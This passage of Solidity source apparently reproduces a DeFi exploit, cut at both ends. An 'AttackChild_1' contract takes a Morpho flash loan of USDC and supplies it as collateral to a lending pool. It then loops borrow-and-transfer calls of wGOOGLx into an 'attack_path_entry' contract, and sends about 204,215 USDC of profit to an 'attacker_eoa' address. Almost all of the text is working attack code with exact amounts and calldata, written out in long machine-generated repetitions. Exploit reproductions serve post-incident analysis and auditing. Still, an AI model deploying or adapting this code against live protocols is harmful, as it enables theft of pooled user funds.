        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa19() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa20() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa21() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa22() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa23() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa24() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa25() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa26() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa27() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa28() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa29() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa30() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa31() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa32() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa33() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa34() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa35() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa36() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa37() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _approveLendingPool() public {
        IERC20Like(Addresses.wGOOGLx).approve(Addresses.A_3EEEB3_FAA6, type(uint256).max);
    }
}

contract AttackChild_1 {
    receive() external payable {}

    function execute(bytes calldata callbackPayload) external payable {
        callbackPayload;
        _startMorphoFlash();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackPayload) external payable {
        amount;
        callbackPayload;
        if (!_callbackDone[MORPHO_CALLBACK]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function attackChildCb() external payable {
        _startMorphoFlash();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback() external payable {
        if (!_callbackDone[MORPHO_CALLBACK]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function replayProfit() external {
        if (!_settleDone(0, 36)) {
            bool __settlementAlreadyMaterialized0_36 = false;
            if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 204215572188) {
                _markSettle(0, 36);
                __settlementAlreadyMaterialized0_36 = true;
            }
            if (!__settlementAlreadyMaterialized0_36) {
                _markSettle(0, 36);
                uint256 settleAmount = 204215572188;
                IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant MORPHO_CALLBACK = keccak256("poc.morpho.callback");
    mapping(bytes32 => bool) private _callbackDone;

    mapping(bytes32 => bool) private _profitSettlementFlag;

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _startMorphoFlash() internal {
        // Exact artifact-backed Morpho flash-loan calldata; ABI re-encoding is intentionally avoided.
        IFlashLoanTarget(Addresses.Morpho)
            .flashLoan(
                Addresses.USDC, 180000000000, hex"0000000000000000000000008b2af1a9885e4755d22ce4a49f7a525a33f1c9e4"
            );
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 profitTransferAmount = 204215572188;
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, profitTransferAmount);
    }

    function flashCallback2() internal {
        _callbackDone[MORPHO_CALLBACK] = true;
        flashCallback3();
        flashCallback6();
        flashCallback9();
        flashCallback12();
        flashCallback15();
        flashCallback18();
        flashCallback21();
        flashCallback24();
        flashCallback27();
        flashCallback30();
        flashCallback33();
        flashCallback36();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.A_3EEEB3_FAA6, type(uint256).max);
        {
            uint256 supplyLiveAmount = 180000000000;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .supply(Addresses.USDC, supplyLiveAmount, address(this), uint16(0));
        }
        IERC20Like(Addresses.wGOOGLx).balanceOf(Addresses.ewGOOGLx);
        {
            uint256 borrowedWgooglxAmount = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, borrowedWgooglxAmount, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_2 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_2);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_2 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_2, 2, uint16(0), address(this));
        }
    }

    function flashCallback6() internal {
        {
            uint256 wGOOGLxTransferAmount_3 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_3);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_3 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_3, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_4 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_4);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_4 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_4, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_5 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_5);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_5 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_5, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_6 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_6);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
    }

    function flashCallback9() internal {
        {
            uint256 a3eeeb3Faa6BorrowAmount_6 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_6, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_7 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_7);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_7 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_7, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_8 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_8);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_8 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_8, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_9 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_9);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_9 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_9, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_10 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_10);
        }
    }

    function flashCallback12() internal {
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_10 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_10, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_11 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_11);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_11 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_11, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_12 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_12);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_12 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_12, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_13 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_13);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_13 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_13, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_14 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_14);
        }
    }

    function flashCallback15() internal {
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_14 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_14, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_15 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_15);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_15 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_15, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_16 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_16);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_16 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_16, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_17 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_17);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_17 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_17, 2, uint16(0), address(this));
        }
    }

    function flashCallback18() internal {
        {
            uint256 wGOOGLxTransferAmount_18 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_18);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_18 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_18, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_19 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_19);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_19 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_19, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_20 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_20);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_20 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_20, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_21 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_21);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
    }

    function flashCallback21() internal {
        {
            uint256 a3eeeb3Faa6BorrowAmount_21 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_21, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_22 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_22);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_22 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_22, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_23 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_23);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_23 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_23, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_24 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_24);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_24 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_24, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_25 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_25);
        }
    }

    function flashCallback24() internal {
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_25 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_25, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_26 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_26);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_26 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_26, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_27 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_27);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_27 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_27, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_28 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_28);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_28 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_28, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_29 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_29);
        }
    }

    function flashCallback27() internal {
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_29 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_29, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_30 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_30);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_30 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_30, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_31 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_31);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_31 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_31, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_32 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_32);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_32 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_32, 2, uint16(0), address(this));
        }
    }

    function flashCallback30() internal {
        {
            uint256 wGOOGLxTransferAmount_33 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_33);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_33 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_33, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_34 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_34);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_34 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_34, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_35 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_35);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_35 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_35, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_36 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_36);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
    }

    function flashCallback33() internal {
        {
            uint256 a3eeeb3Faa6BorrowAmount_36 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_36, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_37 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_37);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_37 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
